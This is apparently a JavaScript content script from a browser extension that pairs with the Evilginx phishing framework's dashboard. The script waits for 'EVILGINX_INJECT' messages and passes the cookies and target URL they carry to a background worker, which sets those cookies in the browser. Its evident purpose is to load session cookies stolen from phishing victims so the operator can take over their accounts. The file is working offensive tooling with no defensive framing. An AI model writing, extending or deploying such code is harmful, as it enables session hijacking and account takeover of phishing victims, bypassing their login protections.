// Evilginx Session Injector — content script
// Detects evilginx dashboard pages and bridges inject requests to the
// background worker which has the chrome.cookies.set() privilege.

(function () {
  // Only activate on pages that identify themselves as the evilginx dashboard.
  // The dashboard sets data-app="evilginx-dashboard" on <body>.
  if (!document.body || document.body.dataset.app !== 'evilginx-dashboard') return;

  // Signal presence to the dashboard JS so it can switch to the fast path.
  window.__evilginxExtension = true;
  document.dispatchEvent(new CustomEvent('evilginx-extension-ready'));

  // Listen for inject payloads posted by the dashboard's injectSession().
  window.addEventListener('message', (event) => {
    if (event.source !== window) return;
    if (!event.data || event.data.type !== 'EVILGINX_INJECT') return;

    const payload = event.data.payload;

    chrome.runtime.sendMessage(
      { action: 'inject', cookies: payload.cookies, targetUrl: payload.target_url },
      (result) => {
        // Forward the result back to the dashboard page.
        window.dispatchEvent(new CustomEvent('evilginx-inject-result', { detail: result || {} }));
      }
    );
  });
})();
